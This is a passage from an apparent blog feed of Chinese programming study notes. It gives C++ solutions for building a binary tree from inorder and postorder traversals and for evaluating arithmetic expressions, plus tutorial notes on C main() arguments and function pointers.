    <url>/2023/04/24/%E7%AE%97%E6%B3%95/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/ab8dde7f01f3440fbbb7993d2411a46b?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">从中序与后序遍历序列构造二叉树_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E4%BA%8C%E5%8F%89%E6%A0%91/%E4%BB%8E%E4%B8%AD%E5%BA%8F%E4%B8%8E%E5%90%8E%E5%BA%8F%E9%81%8D%E5%8E%86%E5%BA%8F%E5%88%97%E6%9E%84%E9%80%A0%E4%BA%8C%E5%8F%89%E6%A0%91.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * struct TreeNode &#123;</span><br><span class="hljs-comment"> *  int val;</span><br><span class="hljs-comment"> *  struct TreeNode *left;</span><br><span class="hljs-comment"> *  struct TreeNode *right;</span><br><span class="hljs-comment"> *  TreeNode(int x) : val(x), left(nullptr), right(nullptr) &#123;&#125;</span><br><span class="hljs-comment"> * &#125;;</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>    <span class="hljs-type">int</span> indexMap;<span class="hljs-comment">//根节点的在后序遍历的下标</span><br>    unordered_map&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; unorderedMap;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * @param inorder int整型vector 中序遍历序列</span><br><span class="hljs-comment">     * @param postorder int整型vector 后序遍历序列</span><br><span class="hljs-comment">     * @return TreeNode类</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-function">TreeNode *<span class="hljs-title">build</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; &amp;inorder, vector&lt;<span class="hljs-type">int</span>&gt; &amp;postorder, <span class="hljs-type">int</span> leftSub, <span class="hljs-type">int</span> rightSub)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (leftSub &gt; rightSub) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">nullptr</span>;<br>        &#125;<br>        <span class="hljs-keyword">auto</span> root = <span class="hljs-keyword">new</span> <span class="hljs-built_in">TreeNode</span>(postorder[indexMap]);<br>        <span class="hljs-keyword">auto</span> index = unorderedMap[postorder[indexMap]];<br>        indexMap--;<br>        root-&gt;right = <span class="hljs-built_in">build</span>(inorder, postorder, index + <span class="hljs-number">1</span>, rightSub);<br>        root-&gt;left = <span class="hljs-built_in">build</span>(inorder, postorder, leftSub, index - <span class="hljs-number">1</span>);<br>        <span class="hljs-keyword">return</span> root;<br>    &#125;<br>    <span class="hljs-function">TreeNode* <span class="hljs-title">buildTree</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp; inorder, vector&lt;<span class="hljs-type">int</span>&gt;&amp; postorder)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here</span><br>        indexMap = postorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>;<br>        <span class="hljs-type">int</span> sub = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; item : inorder) &#123;<br>            unorderedMap[item] = sub++;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">build</span>(inorder, postorder, <span class="hljs-number">0</span>, inorder.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>);<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><ul><li><p>后序遍历的最后一个元素是<code>root</code>的<code>val</code></p></li><li><p>采取递归的方法，创建结点</p></li><li><p>注意创建的顺序，应该是先是右的再左的</p><p>因为创建的顺序应该是是从最小树开始创建</p></li></ul></li><li><p>理解</p><ul><li><pre><code class="c++">        for (const auto&amp; item : inorder) &#123;            unorderedMap[item] = sub++;        &#125;</code></pre><p>将&lt;元素，下标&gt;的方式存放数据</p><p>这样操作的原因是：方便的通过后序遍历找到<code>root</code>，再通过<code>map</code>查找数据</p></li><li><p>把每一个都当成一个<code>root</code></p></li></ul></li><li><p>问题</p><ul><li><p><code>leftSub &gt; rightSub</code></p><blockquote><p>当左节点的下标大于右节点的下标就表示这棵树是NULL</p><p>也就是说子串是无的</p></blockquote></li><li><p>为什么要先创建右节点</p><blockquote><p>因为我们的后序遍历顺序是:左-右-根</p><p>所以当我们把<code>root</code>取出剩下的应该就是右节点</p></blockquote></li></ul></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>newcoder</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>表达式求值</title>
    <link href="/2023/04/21/%E7%AE%97%E6%B3%95/newcoder/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/"/>
    <url>/2023/04/21/%E7%AE%97%E6%B3%95/newcoder/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>[题](<a href="https://www.nowcoder.com/practice/c215ba61c8b1443b996351df929dc4d4?tpId=308&tags=&title=&difficulty=0&judgeStatus=0&rp=0&sourceUrl=/exam/company">表达式求值_牛客题霸_牛客网 (nowcoder.com)</a>)</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B1%82%E5%80%BC.png"></p><ol><li><p>代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs c++"><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br>  <span class="hljs-keyword">public</span>:<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * 代码中的类名、方法名、参数名已经指定，请勿修改，直接返回方法规定的值即可</span><br><span class="hljs-comment">     * 返回表达式的值</span><br><span class="hljs-comment">     * @param s string字符串 待计算的表达式</span><br><span class="hljs-comment">     * @return int整型</span><br><span class="hljs-comment">     */</span><br>        <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">func</span><span class="hljs-params">(string str,<span class="hljs-type">int</span> sub)</span></span>&#123;<br>        <span class="hljs-type">int</span> num=<span class="hljs-number">0</span>;<br>        <span class="hljs-type">char</span> op=<span class="hljs-string">&#x27;+&#x27;</span>;<span class="hljs-comment">//默认前面的数是+</span><br>        <span class="hljs-type">int</span> i=sub;<span class="hljs-comment">//设置值下表，用于递归</span><br>        <span class="hljs-type">int</span> sum=<span class="hljs-number">0</span>;<span class="hljs-comment">//和</span><br>        vector&lt;<span class="hljs-type">int</span>&gt; vector;<span class="hljs-comment">//通过vector,返回sum，和下标</span><br>        stack&lt;<span class="hljs-type">int</span>&gt; stack;<span class="hljs-comment">//栈区存放数字</span><br>        <span class="hljs-keyword">for</span>(;i&lt;str.<span class="hljs-built_in">size</span>();++i) &#123;<br>            <span class="hljs-comment">//下面的是，用于计算数字比如100,这样的多位数字</span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isdigit</span>(str[i])) &#123;<br>                num = num * <span class="hljs-number">10</span> + str[i] - <span class="hljs-string">&#x27;0&#x27;</span>;<br>                <span class="hljs-keyword">if</span> (i != str.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>) &#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br>            <br>            <span class="hljs-comment">//递归标志</span><br>            <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;(&#x27;</span>) &#123;<br>                vector = <span class="hljs-built_in">func</span>(str, ++i);<br>                <span class="hljs-comment">//vector[0]，用于存放sum</span><br>                <span class="hljs-comment">//vector[1],用于存放下标</span><br>                num=vector[<span class="hljs-number">0</span>];<br>                i=vector[<span class="hljs-number">1</span>];<br>                <span class="hljs-keyword">if</span>(i!=str.<span class="hljs-built_in">size</span>()<span class="hljs-number">-1</span>)&#123;<br>                    <span class="hljs-keyword">continue</span>;<br>                &#125;<br>            &#125;<br><br>            <span class="hljs-keyword">switch</span> (op) &#123;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;+&#x27;</span>:<br>                    stack.<span class="hljs-built_in">push</span>(num);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;-&#x27;</span>:<br>                    stack.<span class="hljs-built_in">push</span>(-num);<br>                    <span class="hljs-keyword">break</span>;<br>                <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;*&#x27;</span>:<br>                    num *= stack.<span class="hljs-built_in">top</span>();<br>                    stack.<span class="hljs-built_in">pop</span>();<br>                    stack.<span class="hljs-built_in">push</span>(num);<br>                    <span class="hljs-keyword">break</span>;<br>            &#125;<br>            num=<span class="hljs-number">0</span>;<br>            <span class="hljs-keyword">if</span> (str[i] == <span class="hljs-string">&#x27;)&#x27;</span>) &#123;<br>                <span class="hljs-keyword">break</span>;<span class="hljs-comment">//递归结束的标志</span><br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                op=str[i];<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//下面是求和的过程</span><br>        <span class="hljs-keyword">while</span>(!stack.<span class="hljs-built_in">empty</span>())&#123;<br>            sum+=stack.<span class="hljs-built_in">top</span>();<br>            stack.<span class="hljs-built_in">pop</span>();<br>        &#125;<br>        <span class="hljs-keyword">return</span> ::vector&lt;<span class="hljs-type">int</span>&gt;&#123;sum,i&#125;;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">solve</span><span class="hljs-params">(string s)</span> </span>&#123;<br>        <span class="hljs-comment">// write code here     </span><br>       <span class="hljs-keyword">return</span> <span class="hljs-built_in">func</span>(s,<span class="hljs-number">0</span>).<span class="hljs-built_in">front</span>();<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure></li><li><p>提示</p><p><img src="https://newcode-1317182407.cos.ap-nanjing.myqcloud.com/%E6%A0%88/%E6%B1%82%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%9A%84%E5%80%BC.gif"></p><p>采取栈加递归的方式</p><p>如果是数字，根据前面的符号放进入栈区，如果是’+’，则直接放进去，如果是’-‘，就放入相反数，如果是’*’，就从栈区取出一个元素，然后计算。</p><p>如果遇到<code>(</code>，当作递归的标志，进行递归（注意要设置下标）。</p><p>如果像<code>100</code>，这样的多位数字，就应该进行数字的录入</p></li><li><p>理解</p><ul><li>采用<code>func()</code>,简化运算，方便调用</li><li>使用<code>vector</code>，可以采用返回两个元素（sum，下标）</li></ul></li><li><p>问题</p><p>- </p><blockquote></blockquote></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>那些年刷过的算法题</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>main函数传参</title>
    <link href="/2023/04/20/C/main%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82/"/>
    <url>/2023/04/20/C/main%E5%87%BD%E6%95%B0%E4%BC%A0%E5%8F%82/</url>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="main函数传参"><a href="#main函数传参" class="headerlink" title="main函数传参"></a>main函数传参</h1><h2 id="三个问题"><a href="#三个问题" class="headerlink" title="三个问题"></a>三个问题</h2><ol><li>参数个数</li><li>首个参数到底是谁</li><li>带空格的参数</li></ol><h2 id="基本形式"><a href="#基本形式" class="headerlink" title="基本形式"></a>基本形式</h2><ol><li><pre><code class="c">int main(int argc,char* argv[])&#123;    return 0;&#125;<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><br><span class="hljs-number">2.</span> 第一个参数的意思是：参数的个数<br><br><span class="hljs-number">3.</span> 第二个参数的意思是：存放的参数，而且至少有一个，如果打印的话，结果是该项目的名称<br><br>   实例：<br><br>   ```<span class="hljs-function">c</span><br><span class="hljs-function">   <span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span>* argv[])</span></span><br><span class="hljs-function">   </span>&#123;<br>   <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; argc; i++)<br>   &#123;<br>   <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, argv[i]);<br>   &#125;<br>   <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>   &#125;<br></code></pre></td></tr></table></figure>运行结果：![image-20221225201855246](C:\Users\12414\AppData\Roaming\Typora\typora-user-images\image-20221225201855246.png)</code></pre></li><li></li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>c基础</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>函数指针合集</title>
    <link href="/2023/04/20/C/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%90%88%E9%9B%86/"/>
    <url>/2023/04/20/C/%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%E5%90%88%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p>学习目标：</p><ol><li>认识函数指针</li><li>typedef和函数指针</li><li>万能指针充当函数指针</li></ol><p>[TOC]</p><h1 id="函数指针合集"><a href="#函数指针合集" class="headerlink" title="函数指针合集"></a>函数指针合集</h1><h2 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h2><ol><li><p>什么是函数指针</p><blockquote><p>对应函数在内存当中的首地址</p></blockquote></li><li><p>定义函数指针 </p><ul><li><p>使用(*标识符（可以当作指针变量的名字）)替换函数名，剩下的照抄</p></li><li><p>使用示例</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">func</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    ;<br>&#125;<br><span class="hljs-type">int</span> (*p_func)(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)<span class="hljs-comment">//函数指针</span><br><span class="hljs-type">void</span> (*p)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )=<span class="hljs-literal">NULL</span>;<span class="hljs-comment">//形参可以不写</span><br></code></pre></td></tr></table></figure></li></ul></li><li><p>通过函数指针调用</p><ul><li><p>给函数指针赋值（通常使用函数名）</p><ul><li><p>直接用函数指针替换函数名调用</p></li><li><p>指针的<code>*</code>操作，调用</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">func1</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d,%d\n&quot;</span>,a,b);<br>&#125;<br><span class="hljs-type">void</span> *<span class="hljs-title function_">p_func2</span> <span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;void (*p_func2) (int a,int b)\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-comment">//在main里面的定义的函数指针</span><br>    <span class="hljs-type">void</span> (*p)(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)=<span class="hljs-literal">NULL</span>;<br>    <span class="hljs-type">void</span> *pp=p_func2();<br>    p=func1;<br>    func1(<span class="hljs-number">2</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-comment">//在外面定义的函数指针</span><br>    *p_func2();<br>    *pp;<br>    system(<span class="hljs-string">&quot;pause&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure></li></ul></li><li><p>函数指针有什么用？、</p><blockquote><p>充当回调函数（以函数指针为参数的函数）</p></blockquote><p>实现：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Max</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Min</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)<br>        <span class="hljs-keyword">return</span> b;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Printf_S</span><span class="hljs-params">(<span class="hljs-type">int</span> (*p)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,p(a,b));<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">func</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> (*pp)(<span class="hljs-type">int</span> (<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )=Printf_S;<br>    pp(Min,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>    pp(Max,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    func();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>运行结果：</p><p><img src="C:\Users\12414\Desktop\学\笔记\c\函数指针\函数指针合集.assets\image-20221227220007304.png" alt="image-20221227220007304"></p></li></ol><h2 id="typedef和函数指针"><a href="#typedef和函数指针" class="headerlink" title="typedef和函数指针"></a><code>typedef和函数指针</code></h2><ol><li><p><code>typedef</code>基本用法，给类型起别名   </p></li><li><p>定义函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">Max</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> a&gt;b?a:b;<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">Min</span><span class="hljs-params">(<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-keyword">if</span>(a&gt;b)<br>        <span class="hljs-keyword">return</span> b;<br>    <span class="hljs-keyword">return</span> a;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">Printf_S</span><span class="hljs-params">(<span class="hljs-type">int</span> (*p)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> a,<span class="hljs-type">int</span> b)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,p(a,b));<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">void</span> (*pp)(<span class="hljs-type">int</span> (*)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )=Printf_S;<br>    <span class="hljs-keyword">typedef</span> <span class="hljs-title function_">void</span> <span class="hljs-params">(*ppp)</span><span class="hljs-params">(<span class="hljs-type">int</span> (*)(<span class="hljs-type">int</span> ,<span class="hljs-type">int</span>),<span class="hljs-type">int</span> ,<span class="hljs-type">int</span> )</span>;<br>    ppp p_f=Printf_S;<br>    p_f(Max,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>    pp(Min,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="万能指针充当函数指针"><a href="#万能指针充当函数指针" class="headerlink" title="万能指针充当函数指针"></a>万能指针充当函数指针</h2><ol><li><p>万能指针：空类型的指针(<code>void *p</code>)</p></li><li><p>万能指针可以操作任何类型的指针，但是在使用前必须强制类型转换</p><ul><li>语法：（要转换的类型）</li></ul></li><li><p>万能指针操作数据类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">244</span>;<br>    <span class="hljs-type">float</span> b=<span class="hljs-number">3.14f</span>;<br>    <span class="hljs-type">void</span> *p=<span class="hljs-literal">NULL</span>;<br>    p=&amp;a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(<span class="hljs-type">int</span> *)p);<br>    p=&amp;b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\n&quot;</span>,*(<span class="hljs-type">float</span> *)p);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>函数指针的类型(去掉变量名)</p><p>例如：<code>void (*p)(int,int);</code>类型为<code>void (*)(int,int)</code></p><p>调用</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">int</span> a=<span class="hljs-number">244</span>;<br>    <span class="hljs-type">float</span> b=<span class="hljs-number">3.14f</span>;<br>    <span class="hljs-type">void</span> *p=<span class="hljs-literal">NULL</span>;<br>    p=&amp;a;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d\n&quot;</span>,*(<span class="hljs-type">int</span> *)p);<br>    p=&amp;b;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%f\n&quot;</span>,*(<span class="hljs-type">float</span> *)p);<br>    p=print;<br>    ((<span class="hljs-type">void</span>(*)())p)();<br>    (*(<span class="hljs-type">void</span>(*)())p)();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><ol><li>区分下面4中代码</li></ol>   <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-type">int</span> * p=&amp;a;<br><span class="hljs-type">const</span> * <span class="hljs-type">int</span> p=&amp;a;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> * <span class="hljs-type">const</span> p=&amp;a;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> <span class="hljs-type">const</span> * p=&amp;a;<br></code></pre></td></tr></table></figure><ul><li><p><code>*</code>前面的<code>const</code>写在前面和后面是一样的</p><p> 例如：<code>const *int x=1;</code> <code>int const* x=1;</code> 